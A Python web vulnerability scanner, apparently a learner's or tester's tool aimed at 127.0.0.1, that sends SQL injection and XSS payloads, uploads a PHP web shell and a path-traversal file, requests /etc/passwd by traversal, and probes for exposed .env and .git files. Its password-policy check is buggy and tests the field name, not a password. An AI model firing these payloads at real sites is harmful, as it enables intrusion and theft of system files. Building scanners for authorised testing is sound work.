import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
import re
import logging
import string

# 로깅 설정
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# HTTP 세션 사용
session = requests.Session()

# 웹 스캐너 클래스
class WebScanner:
    def __init__(self, base_url, depth=3):
        self.base_url = base_url
        self.depth = depth
        self.visited_urls = set()
        self.attack_vectors = []
        self.xss_payloads = self.load_xss_payloads('xsspayload.txt')

    def load_xss_payloads(self, filepath):
        try:
            with open(filepath, 'r', encoding='utf-8') as file:
                payloads = [line.strip() for line in file.readlines()]
                logger.info(f"Loaded {len(payloads)} XSS payloads")
                return payloads
        except FileNotFoundError:
            logger.error(f"XSS payload file not found: {filepath}")
            return []
        except UnicodeDecodeError as e:
            logger.error(f"Error decoding file {filepath}: {e}")
            return []


    def run_security_checks(self):
        self.crawl(self.base_url, self.depth)
        
        for url, method, inputs in self.attack_vectors:
            if self.check_sql_injection(url, method, inputs):
                logger.info(f"SQL Injection vulnerability detected at {url}")
            else:
                logger.info(f"No SQL Injection vulnerability detected at {url}")
                
            if self.check_xss(url, method, inputs):
                logger.info(f"XSS vulnerability detected at {url}")
            else:
                logger.info(f"No XSS vulnerability detected at {url}")
        
        if self.check_information_disclosure(self.base_url):
            logger.info("Information Disclosure vulnerability detected.")
        else:
            logger.info("No Information Disclosure vulnerability detected.")

        if self.check_password_strength_policy(self.base_url):
            logger.info("Password strength policy is weak or missing.")
        else:
            logger.info("Password strength policy is adequate.")

        if self.check_location_exposure(self.base_url):
            logger.info("Location Exposure vulnerability detected.")
        else:
            logger.info("No Location Exposure vulnerability detected.")
        
        if self.check_directory_indexing(self.base_url):
            logger.info("Directory Indexing vulnerability detected.")
        else:
            logger.info("No Directory Indexing vulnerability detected.")
        
        if self.check_file_upload(self.base_url):
            logger.info("File Upload vulnerability detected.")
        else:
            logger.info("No File Upload vulnerability detected.")
        
        if self.check_file_download(self.base_url):
            logger.info("File Download vulnerability detected.")
        else:
            logger.info("No File Download vulnerability detected.")

    def crawl(self, url, depth):
        if depth == 0 or url in self.visited_urls or not url.startswith(self.base_url):
            return
        self.visited_urls.add(url)
        
        try:
            response = session.get(url, timeout=10)
            response.raise_for_status()
        except requests.RequestException as e:
            logger.error(f"Error during request to {url}: {e}")
            return

        soup = BeautifulSoup(response.text, 'html.parser')

        forms = soup.find_all('form')
        for form in forms:
            action = form.get('action')
            method = form.get('method', 'get').lower()
            inputs = form.find_all('input')
            form_url = urljoin(self.base_url, action)
            if self.check_url_existence(form_url):
                self.attack_vectors.append((form_url, method, inputs))

        links = soup.find_all('a', href=True)
        for link in links:
            href = link.get('href')
            next_url = urljoin(self.base_url, href)
            if self.check_url_existence(next_url):
                self.crawl(next_url, depth - 1)

        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        if query_params:
            self.attack_vectors.append((url, 'get', query_params))

    def check_sql_injection(self, url, method, inputs):
        payloads = [
            (["'", '"', ";", "--", "/*", "*/", "#"], ["syntax error", "unexpected", "error in your SQL syntax"]),
            (["1=1", "' OR '1'='1", "\" OR \"1\"=\"1"], [""]),
            (["1=2", "' AND '1'='2", "\" AND \"1\"=\"2"], [""]),
            (["UNION SELECT NULL", "UNION SELECT NULL, NULL", "UNION SELECT NULL, NULL, NULL"], ["column", "syntax error", "number of columns"]),
            (["' OR SLEEP(5)--", "\" OR SLEEP(5)--"], [""]),
        ]

        for payload_group, patterns in payloads:
            for payload in payload_group:
                response = self.send_payload(url, method, inputs, payload)
                if response:
                    if "SLEEP" in payload and response.elapsed.total_seconds() > 5:
                        logger.info(f"Time-based SQL Injection vulnerability detected at {url} with payload: {payload}")
                        return True
                    if any(pattern in response.text.lower() for pattern in patterns):
                        logger.info(f"SQL Injection vulnerability detected at {url} with payload: {payload}")
                        return True
        return False

    def check_xss(self, url, method, inputs):
        for payload in self.xss_payloads:
            response = self.send_payload(url, method, inputs, payload)
            if response and payload in response.text:
                logger.info(f"XSS vulnerability detected at {url} with payload: {payload}")
                return True
        return False

    def send_payload(self, url, method, inputs, payload):
        if isinstance(inputs, dict):
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query)
            for key in query_params:
                query_params[key] = payload
            encoded_query = urlencode(query_params, doseq=True)
            attack_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{encoded_query}"
        else:
            data = {inp.get('name'): payload for inp in inputs if inp.get('name')}
            if method == 'post':
                if not self.check_url_existence(url):
                    return None
                try:
                    response = session.post(url, data=data, timeout=10)
                    response.raise_for_status()
                    return response
                except requests.RequestException as e:
                    logger.error(f"Error during POST request to {url} with data {data}: {e}")
                    return None
            else:
                parsed_url = urlparse(url)
                query_params = parse_qs(parsed_url.query)
                for key in data:
                    query_params[key] = payload
                encoded_query = urlencode(query_params, doseq=True)
                attack_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{encoded_query}"
        
        try:
            response = session.get(attack_url, timeout=10)
            response.raise_for_status()
            return response
        except requests.RequestException as e:
            logger.error(f"Error during request to {attack_url}: {e}")
            return None

    def check_url_existence(self, url):
        try:
            response = session.head(url, allow_redirects=True, timeout=10)
            return response.status_code == 200
        except requests.RequestException as e:
            logger.error(f"Error checking URL existence: {url}, {e}")
            return False

    def check_information_disclosure(self, url):
        sensitive_files = [".env", ".git", ".DS_Store", "config.php", "web.config", "database.yml"]
        debug_patterns = [
            "exception", "error", "stack trace", "traceback", "debug", "line", "file", "fatal", "not found",
            "permission denied", "unauthorized", "access denied", "undefined variable", "undefined index", "SQL"
        ]
        vulnerable = False

        for file in sensitive_files:
            file_url = urljoin(url, file)
            try:
                response = session.get(file_url, timeout=10)
                if response.status_code == 200:
                    logger.info(f"Sensitive file exposed: {file_url}")
                    vulnerable = True
            except requests.RequestException as e:
                logger.error(f"Error during request to {file_url}: {e}")

        try:
            response = session.get(url, timeout=10)
            response.raise_for_status()
            page_content = response.text.lower()

            for pattern in debug_patterns:
                if pattern in page_content:
                    logger.info(f"Potential information disclosure detected at {url} with pattern: {pattern}")
                    vulnerable = True
        except requests.RequestException as e:
            logger.error(f"Error during request to {url}: {e}")

        test_urls = [
            f"{url}/nonexistentpage",
            f"{url}?testparam=' OR 1=1 --"
        ]

        for test_url in test_urls:
            try:
                response = session.get(test_url, timeout=10)
                response.raise_for_status()
                page_content = response.text.lower()

                for pattern in debug_patterns:
                    if pattern in page_content:
                        logger.info(f"Potential information disclosure detected at {test_url} with pattern: {pattern}")
                        vulnerable = True
            except requests.RequestException as e:
                logger.error(f"Error during request to {test_url}: {e}")

        return vulnerable

    def check_password_strength_policy(self, url):
        try:
            response = session.get(url, timeout=10)
            response.raise_for_status()
            soup = BeautifulSoup(response.text, 'html.parser')
            password_fields = soup.find_all('input', {'type': 'password'})
            for password_field in password_fields:
                form = password_field.find_parent('form')
                if form:
                    form_action = form.get('action')
                    form_method = form.get('method', 'get').lower()
                    form_url = urljoin(self.base_url, form_action)
                    if self.check_password_policy(form):
                        logger.info(f"Weak password policy detected at form {form_url} with method {form_method}")
                        return True
            return False
        except requests.RequestException as e:
            logger.error(f"Error during request to {url}: {e}")
            return False

    def check_password_policy(self, form):
        patterns = {
            "length": r".{8,}",
            "uppercase": r"[A-Z]",
            "lowercase": r"[a-z]",
            "digit": r"[0-9]",
            "special": r"[!@#\$%\^&\*\(\)_\+\-=\[\]\{\};:'\"\\|,.<>\/?]",
            "no_common_passwords": r"^(?!(password|123456|12345678|admin|welcome)).*$",
            "no_repeated_chars": r"^(?!.*(.)\1{2}).*$"
        }
        password_field_name = form.find('input', {'type': 'password'}).get('name')
        for pattern_name, pattern in patterns.items():
            if not re.search(pattern, password_field_name):
                return False
        return True

    def check_location_exposure(self, url):
        try:
            response = session.get(url, timeout=10)
            ip_headers = ["X-Forwarded-For", "X-Real-IP", "Client-IP", "X-Cluster-Client-IP"]
            gps_keywords = ["navigator.geolocation.getCurrentPosition", "getCurrentPosition"]

            for header in ip_headers:
                if header in response.headers:
                    logger.info(f"Potential IP address exposure in header: {header} = {response.headers[header]}")
                    return True
            
            if any(keyword in response.text for keyword in gps_keywords):
                logger.info(f"Potential GPS data exposure found in response.")
                return True

            soup = BeautifulSoup(response.text, 'html.parser')
            if soup.find("meta", {"name": "geo.position"}):
                logger.info(f"Potential GPS meta tag exposure found in response.")
                return True
        except requests.RequestException as e:
            logger.error(f"Error during request to {url}: {e}")

        return False

    def check_directory_indexing(self, url):
        potential_directories = ['img', 'images', 'uploads', 'files', 'assets']
        for directory in potential_directories:
            test_url = urljoin(url, directory)
            try:
                response = session.get(test_url, timeout=10)
                response.raise_for_status()
                if "Index of /" in response.text or "directory listing" in response.text.lower():
                    logger.info(f"Directory Indexing vulnerability detected at {test_url}")
                    return True
            except requests.RequestException as e:
                logger.error(f"Error during request to {test_url}: {e}")
        return False
    
    def check_file_upload(self, url):
        try:
            response = session.get(url, timeout=10)
            response.raise_for_status()
            soup = BeautifulSoup(response.text, 'html.parser')
            file_upload_forms = soup.find_all('form', {'enctype': 'multipart/form-data'})
            if file_upload_forms:
                for form in file_upload_forms:
                    form_action = form.get('action')
                    form_method = form.get('method', 'post').lower()
                    form_url = urljoin(self.base_url, form_action)
                    if self.check_file_upload_form(form_url):
                        logger.info(f"File Upload vulnerability detected at {form_url} with method {form_method}")
                        return True
            return False
        except requests.RequestException as e:
            logger.error(f"Error during request to {url}: {e}")
            return False


    def check_file_upload_form(self, form_url):
        meta_char_file = {'file': ('../test.txt', 'This is a test file.')}
        web_shell_file = {'file': ('shell.php', '<?php echo shell_exec($_GET["cmd"]); ?>')}

        try:
            response = session.post(form_url, files=meta_char_file, timeout=10)
            if response.status_code == 200:
                logger.info(f"Meta character file upload successful at {form_url}")
                return True
        except requests.RequestException as e:
            logger.error(f"Error during meta character file upload to {form_url}: {e}")

        try:
            response = session.post(form_url, files=web_shell_file, timeout=10)
            if response.status_code == 200:
                logger.info(f"Web shell file upload successful at {form_url}")
                return True
        except requests.RequestException as e:
            logger.error(f"Error during web shell file upload to {form_url}: {e}")

        return False

    def check_file_download(self, url):
        #원래라면 이게 맞을 것 같은데 현재 다운로드 페이지가 이게 맞는지 모르겠어서...테스트는 못하고 작성했습니다
        try:
            response = session.get(url, timeout=10)
            response.raise_for_status()
            soup = BeautifulSoup(response.text, 'html.parser')
            download_links = soup.find_all('a', href=True)

            for link in download_links:
                href = link.get('href')
                if 'filename=' in href:
                    download_url = urljoin(self.base_url, href)
                    if self.check_url_existence(download_url):
                        logger.info(f"Valid file download link detected at {download_url}")

                        parsed_url = urlparse(download_url)
                        params = parse_qs(parsed_url.query)
                        params['filename'] = '../../../../../../etc/passwd'
                        modified_query = urlencode(params, doseq=True)
                        test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{modified_query}"
                        
                        try:
                            test_response = session.get(test_url, timeout=10)
                            if test_response.status_code == 200 and 'root:' in test_response.text:
                                logger.info(f"File Download vulnerability detected at {test_url}")
                                return True
                        except requests.RequestException as e:
                            logger.error(f"Error during file download test request to {test_url}: {e}")

            return False
        except requests.RequestException as e:
            logger.error(f"Error during request to {url}: {e}")
            return False




# 예제 실행
base_url = "http://127.0.0.1"
scanner = WebScanner(base_url)
scanner.run_security_checks()
